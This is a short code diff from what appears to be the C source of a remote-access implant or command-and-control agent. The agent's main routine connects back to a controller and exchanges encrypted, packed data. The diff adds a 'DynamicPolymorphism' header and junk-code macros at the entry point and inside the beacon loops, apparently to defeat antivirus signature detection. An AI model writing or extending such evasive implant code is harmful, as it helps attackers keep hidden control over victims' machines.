@@ -1,5 +1,6 @@
 #include "main.h"
 #include "ApiLoader.h"
+#include "DynamicPolymorphism.h"
 #include "Commander.h"
 #include "utils.h"
 #include "Crypt.h"
@@ -40,6 +41,7 @@ static Connector* CreateConnector()
 
 DWORD WINAPI AgentMain(LPVOID lpParam)
 {
+	AX_JUNK_1;
 	if (!ApiLoad())
 		return 0;
 
@@ -63,10 +65,12 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 	Packer_Pack32(packerOut, 0);
 
 	do {
+		AX_JUNK_2;
 		if (!g_Connector->WaitForConnection(g_Connector))
 			continue;
 
 		do {
+			AX_JUNK_3;
 			if (Packer_datasize(packerOut) > 4) {
 				Packer_Set32(packerOut, 0, Packer_datasize(packerOut));
 				g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey);
